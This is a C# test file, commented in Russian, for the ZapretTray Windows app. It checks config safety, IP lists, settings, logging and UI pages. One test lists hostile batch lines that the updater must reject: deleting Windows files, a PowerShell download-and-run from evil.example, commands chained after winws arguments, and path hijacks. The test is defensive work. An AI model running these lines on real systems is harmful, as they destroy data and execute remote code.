// То, что раньше тестами не покрывалось: вычёркивание личного из ошибок VPN, защита конфигов Flowseal,
// отбор адресов игр, пересборка списка IP, tray.ini, журнал, «Что нового», страница «Проверки»,
// поиск в окне выбора приложения. Сеть не нужна.
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace ZapretTray
{
    static class Cov
    {
        static int pass, fail;
        static readonly List<string> log = new List<string>();
        const BindingFlags Any = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance | BindingFlags.Static;

        static void Ok(bool c, string n) { if (c) pass++; else fail++; log.Add((c ? "OK   " : "FAIL ") + n); }

        [STAThread]
        static void Main()
        {
            ControlPanel.NoAnimation = true;
            Application.EnableVisualStyles();
            foreach (var t in new Action[] { UnsafeConfigs, GameServers, IpsetRebuild, TrayIni, Log, WhatsNew, ChecksPage, Picker })
            {
                try { t(); }
                catch (Exception e) { Ok(false, t.Method.Name + ": ТЕСТ УПАЛ: " + e.GetType().Name + ": " + e.Message); }
            }
            File.WriteAllLines("result.txt", log.Concat(new[] { "ИТОГО ok=" + pass + " fail=" + fail }));
        }

        static string Temp()
        {
            var d = Path.Combine(Path.GetTempPath(), "zt-cov-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(d);
            return d;
        }

        // ---------- конфиги от Flowseal: разрешён только запуск winws из bin
        static void UnsafeConfigs()
        {
            var core = Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, @"..\..\..\payload\core"));
            var bats = Directory.GetFiles(core, "general*.bat");
            Ok(bats.Length >= 3, "обновления: в сборке есть конфиги (" + bats.Length + ")");
            var raw = System.Text.Encoding.GetEncoding(28591);
            var bad = bats.Where(b => ZapretUpdater.UnsafeLine(File.ReadAllText(b, raw)) != null).Select(Path.GetFileName).ToList();
            Ok(bad.Count == 0, "обновления: свои конфиги проходят проверку" + (bad.Count > 0 ? ": " + string.Join(", ", bad) : ""));

            var good = File.ReadAllText(bats[0], raw);
            var evil = new[]
            {
                "del /q C:\\Windows\\*",
                "powershell -c iwr evil.example | iex",
                "start \"zapret: %~n0\" /b \"%BIN%winws.exe\" --wf-tcp=80 & calc",
                "start \"zapret: %~n0\" /b \"%BIN%winws.exe\" --wf-tcp=80 | calc",
                "start \"zapret: %~n0\" /b \"C:\\evil.exe\" --wf-tcp=80",
                "start \"zapret: %~n0\" /b \"%BIN%winws.exe\" --wf-tcp=80 > C:\\Windows\\x",
                "--dpi-desync=fake & calc",
                ":: комментарий & calc",
                "call evil.bat",
                "call service.bat x & calc",
                "set \"BIN=C:\\evil\\\"",
                "cd /d C:\\Windows",
            };
            foreach (var line in evil)
                Ok(ZapretUpdater.UnsafeLine(good + "\r\n" + line + "\r\n") == line, "обновления: отвергнута строка «" + line + "»");
        }

        // ---------- какие адреса считаются сервером игры
        static void GameServers()
        {
            Func<string, int, bool> G = (ip, port) => Util.IsGameServer(ip.Split('.').Select(byte.Parse).ToArray(), port);
            Ok(G("185.10.20.30", 27015), "игры: публичный адрес на игровом порту - сервер");
            foreach (var port in new[] { 53, 80, 443, 853 }) Ok(!G("185.10.20.30", port), "игры: порт " + port + " не берётся");
            foreach (var ip in new[] { "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9", "104.16.5.5", "172.67.1.1", "146.75.1.1", "151.101.1.1" })
                Ok(!G(ip, 27015), "игры: " + ip + " (DNS/CDN) не берётся");
            foreach (var ip in new[] { "10.0.0.5", "192.168.1.10", "172.16.0.1", "127.0.0.1", "198.18.0.5", "0.0.0.0" })
                Ok(!G(ip, 27015), "игры: " + ip + " (не интернет) не берётся");
            Ok(Util.ParseSubnet("1.2.3.0/24") != null && Util.ParseSubnet("1.2.3/24") == null && Util.ParseSubnet("300.1.1.0/24") == null, "игры: разбор подсети");
        }

        // ---------- рабочий список IP: свои адреса дописываются и убираются, базовый список не трогается
        static void IpsetRebuild()
        {
            var dir = Temp();
            try
            {
                var p = new AppPaths(dir);
                Directory.CreateDirectory(p.Lists);
                File.WriteAllLines(p.IpsetAll, new[] { "1.1.0.0/16", "2.2.0.0/16" });
                string msg;
                Ok(Ipset.Rebuild(p, new[] { "5.5.5.0/24", "6.6.6.0/24", "1.1.0.0/16" }, out msg), "IP: пересборка прошла");
                var all = Util.ReadEntries(p.IpsetAll);
                Ok(all.Contains("1.1.0.0/16") && all.Contains("2.2.0.0/16") && all.Contains("5.5.5.0/24") && all.Contains("6.6.6.0/24"), "IP: свои адреса дописаны, базовые на месте");
                Ok(all.Count(a => a == "1.1.0.0/16") == 1, "IP: адрес из базового списка не задвоился");
                Ok(!Util.ReadEntries(p.IpsetAdded).Contains("1.1.0.0/16"), "IP: базовый адрес не помечен как наш");

                Ipset.Rebuild(p, new[] { "5.5.5.0/24" }, out msg);
                all = Util.ReadEntries(p.IpsetAll);
                Ok(!all.Contains("6.6.6.0/24") && all.Contains("5.5.5.0/24") && all.Contains("2.2.0.0/16"), "IP: убранный адрес ушёл, остальные остались");

                File.WriteAllLines(p.IpsetAll, new[] { "1.1.0.0/16", "2.2.0.0/16" });   // переустановка: чистый список, заметка осталась
                Ipset.Rebuild(p, new[] { "5.5.5.0/24" }, out msg);
                Ok(Util.ReadEntries(p.IpsetAll).Contains("5.5.5.0/24"), "IP: после переустановки адреса дописаны снова");

                File.WriteAllLines(p.IpsetAll, new[] { Ipset.Placeholder });
                Ok(!Ipset.Rebuild(p, new[] { "5.5.5.0/24" }, out msg) && msg.Length > 0, "IP: режим none - список не трогаем и объясняем почему");
                Ok(Util.ReadEntries(p.IpsetAll).Single() == Ipset.Placeholder, "IP: заглушка не перезаписана");
            }
            finally { try { Directory.Delete(dir, true); } catch { } }
        }

        // ---------- tray.ini
        static void TrayIni()
        {
            var dir = Temp();
            try
            {
                var f = Path.Combine(dir, "tray.ini");
                var s = new Settings(f);
                Ok(s.Get("nothing") == null && s.GetBool("nothing", true), "tray.ini: нет файла - значения по умолчанию");
                s.Set("theme", "dark"); s.SetBool("watchdog", true); s.Set("dnsauto", "off");
                var r = new Settings(f);
                Ok(r.Get("theme") == "dark" && r.GetBool("watchdog", false) && r.Get("dnsauto") == "off", "tray.ini: значения сохраняются");
                r.Set("dnsauto", null);
                Ok(new Settings(f).Get("dnsauto") == null && !File.ReadAllText(f).Contains("dnsauto"), "tray.ini: null удаляет ключ");
                Ok(new Settings(f).Get("THEME") == "dark", "tray.ini: регистр ключа не важен");
                File.WriteAllLines(f, new[] { "мусор", "=пусто", "a = 1 " });
                Ok(new Settings(f).Get("a") == "1", "tray.ini: мусорные строки не мешают");
            }
            finally { try { Directory.Delete(dir, true); } catch { } }
        }

        // ---------- журнал
        static void Log()
        {
            var dir = Temp();
            var old = Logger.File_;
            try
            {
                Logger.File_ = Path.Combine(dir, "tray.log");
                Logger.Write("первая строка");
                Logger.Write("вторая строка");
                var tail = Logger.Tail(10);
                Ok(tail.Count == 2 && tail[1].Contains("вторая строка"), "журнал: пишется и читается с конца");
                File.WriteAllText(Logger.File_, new string('x', 600 * 1024));
                Logger.Write("после переполнения");
                Ok(File.Exists(Logger.File_ + ".old") && new FileInfo(Logger.File_).Length < 600 * 1024, "журнал: большой уходит в tray.log.old");
                Logger.File_ = Path.Combine(dir, "нет-папки", "tray.log");
                bool fine = true;
                try { Logger.Write("в никуда"); Logger.Tail(5); } catch { fine = false; }
                Ok(fine, "журнал: недоступная папка не роняет программу");
            }
            finally { Logger.File_ = old; try { Directory.Delete(dir, true); } catch { } }
        }

        // ---------- «Что нового» есть для текущей версии
        static void WhatsNew()
        {
            var field = typeof(WhatsNewDialog).GetField("Notes", Any);
            Ok(field != null, "«Что нового»: список заметок найден");
            if (field == null) return;
            var notes = (System.Collections.IDictionary)field.GetValue(null);
            Ok(notes.Contains(AppInfo.Version), "«Что нового»: есть заметка для версии " + AppInfo.Version);
            foreach (string v in notes.Keys)
            {
                if (v == "welcome" || v == "ask") continue;   // окно «Привет» для новичков и вопрос про обновление - не версии
                Version parsed;
                Ok(Version.TryParse(v.Contains('.') ? v : v + ".0", out parsed), "«Что нового»: версия «" + v + "» читается числом");
            }
        }

        // ---------- страницы окна: каждая горячая точка что-то делает и ничего не роняет
        // Рисует страницу, находит места, где курсор становится рукой, и нажимает каждое
        static List<Point> HotSpots(IPanelView v, Control host)
        {
            var spots = new List<Point>();
            using (var b = new Bitmap(1000, 900))
            using (var g = Graphics.FromImage(b))
            {
                v.DrawHeader(g, new Rectangle(0, 0, 772, 60), Point.Empty);
                v.Draw(g, 0, 60 + v.Extra, Point.Empty);
                for (int y = 0; y < 900; y += 6)
                    for (int x = 0; x < 1000; x += 6)
                    {
                        var p = new Point(x, y);
                        if ((v.Hot(p) || v.HeaderHot(p)) && !spots.Any(s => Math.Abs(s.X - x) <= 24 && Math.Abs(s.Y - y) <= 12)) spots.Add(p);
                    }
            }
            return spots;
        }

        static void Redraw(IPanelView v)
        {
            using (var b = new Bitmap(1000, 900))
            using (var g = Graphics.FromImage(b))
            {
                v.DrawHeader(g, new Rectangle(0, 0, 772, 60), Point.Empty);
                v.Draw(g, 0, 60 + v.Extra, Point.Empty);
            }
        }

        static void ChecksPage()
        {
            foreach (var mode in new[] { Theme.Dark, Theme.Light })
            {
                Theme.Mode = mode;
                var items = new List<Check> { new Check("https://youtube.com", true), new Check("https://arcraiders.com", false) };
                var did = new List<string>();
                var v = new ChecksView(() => items.ToList(), u => did.Add("add"), (c, r) => did.Add("toggle " + c.Url), c => did.Add("remove " + c.Url));
                using (var host = new Form { Size = new Size(1000, 900) })
                {
                    host.CreateControl();
                    v.Activate(host, true);
                    var spots = HotSpots(v, host);
                    Ok(spots.Count >= 4, mode + " «Проверки»: есть нажимаемые места (" + spots.Count + ")");
                    foreach (var s in spots) { Redraw(v); v.Click(s); }
                    Ok(did.Contains("toggle https://youtube.com") && did.Contains("toggle https://arcraiders.com"), mode + " «Проверки»: переключатель у каждой строки");
                    Ok(did.Contains("remove https://youtube.com") && did.Contains("remove https://arcraiders.com"), mode + " «Проверки»: удаление у каждой строки");

                    var box = host.Controls.OfType<TextBox>().FirstOrDefault();
                    Ok(box != null, mode + " «Проверки»: поле ввода на месте");
                    if (box != null)
                    {
                        did.Clear();
                        box.Text = "не сайт";
                        v.GetType().GetMethod("Add", Any).Invoke(v, null);
                        Ok(did.Count == 0 && box.Text == "не сайт", mode + " «Проверки»: мусор не добавляется, текст не стирается");
                        box.Text = "discord.com";
                        v.GetType().GetMethod("Add", Any).Invoke(v, null);
                        Ok(did.Contains("add") && box.Text == "", mode + " «Проверки»: сайт добавляется, поле очищается");
                    }
                    items.Clear();
                    v.Activate(host, false); v.Activate(host, true);
                    bool fine = true;
                    try { Redraw(v); } catch { fine = false; }
                    Ok(fine, mode + " «Проверки»: пустой список не роняет");
                }
            }
        }
        // ---------- окно выбора приложения: поиск
        static void Picker()
        {
            var items = new List<PickItem>
            {
                new PickItem { Title = "Discord", Sub = "Discord.exe", Exe = "Discord" },
                new PickItem { Title = "Steam", Sub = "steam.exe", Exe = "steam" },
                new PickItem { Title = "Wardogs", Sub = "WardogsClient-Win64-Shipping.exe", Exe = "WardogsClient-Win64-Shipping" },
            };
            var ctor = typeof(PickerForm).GetConstructors(Any).First();
            using (var f = (PickerForm)ctor.Invoke(new object[] { "Добавить", "подсказка", (Func<List<PickItem>>)(() => items), true, null }))
            {
                var list = (ListBox)typeof(PickerForm).GetField("list", Any).GetValue(f);
                var search = (TextBox)typeof(PickerForm).GetField("search", Any).GetValue(f);
                Ok(list.Items.Count == 3, "выбор приложения: все строки в списке");
                search.Text = "STEAM";
                Ok(list.Items.Count == 1, "выбор приложения: поиск без учёта регистра");
                search.Text = "shipping";
                Ok(list.Items.Count == 1, "выбор приложения: ищет и по имени файла");
                search.Text = "нет такого";
                Ok(list.Items.Count == 0, "выбор приложения: ничего не нашлось - пусто, не падает");
                search.Text = "";
                Ok(list.Items.Count == 3, "выбор приложения: очистил поиск - всё вернулось");
                bool fine = true;
                try { using (var b = new Bitmap(f.Width, f.Height)) f.DrawToBitmap(b, new Rectangle(0, 0, f.Width, f.Height)); } catch { fine = false; }
                Ok(fine, "выбор приложения: окно рисуется");
            }
        }
    }
}
